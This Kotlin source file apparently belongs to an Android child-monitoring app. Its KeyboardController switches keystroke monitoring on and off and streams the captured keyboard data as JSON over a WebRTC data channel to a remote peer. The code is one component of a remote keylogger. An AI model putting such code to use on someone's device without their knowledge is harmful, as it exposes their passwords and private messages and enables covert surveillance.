package nexus.android.child.components.keyboard

import android.content.Context
import android.util.Log
import nexus.android.child.commands.KeyboardHandler
import org.webrtc.DataChannel
import java.nio.ByteBuffer

/**
 * KeyboardController manages command-based keyboard monitoring.
 */
class KeyboardController(
    private val context: Context,
    private val dataChannel: DataChannel
) : KeyboardHandler {

    @Volatile
    private var isMonitoring: Boolean = false

    private val dataChannelClient = object : DataChannelClient {
        override fun send(jsonPayload: String): Boolean {
            return try {
                if (dataChannel.state() != DataChannel.State.OPEN) {
                    Log.w(TAG, "DataChannel not open, cannot send keyboard data")
                    return false
                }
                
                val bytes = jsonPayload.toByteArray(Charsets.UTF_8)
                val buffer = DataChannel.Buffer(ByteBuffer.wrap(bytes), false)
                val sent = dataChannel.send(buffer)
                
                if (sent) {
                    Log.d(TAG, "Keyboard data sent successfully (${bytes.size} bytes)")
                } else {
                    Log.w(TAG, "Failed to send keyboard data")
                }
                
                sent
            } catch (e: Exception) {
                Log.e(TAG, "Error sending keyboard data", e)
                false
            }
        }
    }

    override fun startKeyboardMonitoring() {
        if (isMonitoring) {
            Log.d(TAG, "⚠️ Keyboard monitoring already active")
            return
        }

        Log.d(TAG, "🚀 Starting keyboard monitoring...")
        
        KeyboardMonitor.instance.setDataChannelClient(dataChannelClient)
        setMonitoring(true)
        
        isMonitoring = true
        Log.d(TAG, "✅ Keyboard monitoring started successfully")
    }

    override fun stopKeyboardMonitoring() {
        if (!isMonitoring) {
            Log.d(TAG, "⚠️ Keyboard monitoring already stopped")
            return
        }

        Log.d(TAG, "🛑 Stopping keyboard monitoring...")
        
        setMonitoring(false)
        KeyboardMonitor.instance.setDataChannelClient(null)
        
        isMonitoring = false
        Log.d(TAG, "✅ Keyboard monitoring stopped successfully")
    }

    fun cleanup() {
        if (isMonitoring) {
            stopKeyboardMonitoring()
        }
    }

    companion object {
        private const val TAG = "KeyboardController"
        
        @Volatile
        private var isMonitoringEnabled: Boolean = false
        
        fun isMonitoringEnabled(): Boolean = isMonitoringEnabled
        
        private fun setMonitoring(enabled: Boolean) {
            isMonitoringEnabled = enabled
            Log.d(TAG, "Keyboard monitoring ${if (enabled) "enabled" else "disabled"}")
        }
    }
}
